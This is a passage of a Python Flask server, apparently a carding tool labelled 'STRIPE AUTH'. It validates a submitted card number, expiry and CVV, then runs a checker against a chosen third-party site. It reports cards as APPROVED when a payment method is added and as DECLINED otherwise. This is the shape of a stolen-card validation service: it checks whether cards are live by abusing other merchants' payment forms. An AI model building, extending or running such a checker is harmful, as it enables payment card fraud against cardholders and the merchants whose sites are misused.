                'status': 'ERROR',
                'message': 'Invalid card number',
                'gateway': 'STRIPE AUTH'
            }), 400
        
        # Handle year format (YY or YYYY)
        if len(exp_year) == 2:
            # Convert YY to YYYY (assume 2000+)
            current_year = datetime.now().year
            century = current_year // 100 * 100
            exp_year = str(century + int(exp_year))
        elif len(exp_year) != 4:
            return jsonify({
                'response': 'ERROR',
                'status': 'ERROR',
                'message': 'Invalid year format. Use YY or YYYY',
                'gateway': 'STRIPE AUTH'
            }), 400
        
        # Validate expiration month
        if not exp_month.isdigit() or int(exp_month) < 1 or int(exp_month) > 12:
            return jsonify({
                'response': 'ERROR',
                'status': 'ERROR',
                'message': 'Invalid expiration month',
                'gateway': 'STRIPE AUTH'
            }), 400
        
        # Validate CVV
        if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
            return jsonify({
                'response': 'ERROR',
                'status': 'ERROR',
                'message': 'Invalid CVV',
                'gateway': 'STRIPE AUTH'
            }), 400
        
        # Check if site URL is valid
        if not site or '/' in site or 'http' in site.lower():
            return jsonify({
                'response': 'ERROR',
                'status': 'ERROR',
                'message': 'Invalid site URL. Do not include http:// or https://',
                'gateway': 'STRIPE AUTH'
            }), 400
        
        # Generate check ID
        check_id = f"{cc[:6]}_{int(time.time())}"
        
        # Check if this card is already being processed
        with check_lock:
            if check_id in active_checks:
                return jsonify({
                    'response': 'ERROR',
                    'status': 'ERROR',
                    'message': 'Card check already in progress',
                    'check_id': check_id,
                    'gateway': 'STRIPE AUTH'
                }), 429
            
            active_checks[check_id] = {
                'status': 'PROCESSING',
                'started': datetime.now().isoformat()
            }
        
        try:
            # Initialize checker
            checker = StripeAuthCheckerExact(site)
            
            # Run check
            print(f"[API] Starting check for {cc[:6]}...{cc[-4:]} on {site}")
            result = checker.check_card(cc, cvv, exp_month, exp_year)
            
            # Add masked card for response
            masked_card = f"{cc[:4]}****{cc[-4:]}"
            result['card_masked'] = masked_card
            
            # Ensure response format is correct
            if result['response'] == 'APPROVED':
                result['status'] = 'APPROVED'
                if not result['message'] or 'payment method added' not in result['message'].lower():
                    result['message'] = 'Payment method added successfully'
            elif result['response'] == 'DECLINED':
                result['status'] = 'DECLINED'
                if not result['message'] or 'card was declined' not in result['message'].lower():
                    result['message'] = 'Your card was declined'
            
            # Clean up
            with check_lock:
                if check_id in active_checks:
                    del active_checks[check_id]
            
            return jsonify(result)
            
        except Exception as e:
            # Clean up on error
            with check_lock:
                if check_id in active_checks:
                    del active_checks[check_id]
            
            return jsonify({
                'response': 'ERROR',
                'status': 'ERROR',
                'message': f'Check failed: {str(e)}',
                'check_id': check_id,
                'gateway': 'STRIPE AUTH'
            }), 500
            
    except Exception as e:
        return jsonify({
            'response': 'ERROR',
            'status': 'ERROR',
            'message': f'Invalid request: {str(e)}',
            'gateway': 'STRIPE AUTH'
        }), 400


@app.route('/status', methods=['GET'])
def api_status():
    """API status endpoint"""
    with check_lock:
        active_count = len(active_checks)
    
    return jsonify({
        'status': 'online',
        'active_checks': active_count,
        'timestamp': datetime.now().isoformat(),
        'version': '1.0'
    })


@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint for Render"""
    return jsonify({'status': 'healthy'}), 200


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 7700))
    app.run(host='0.0.0.0', port=port, debug=False)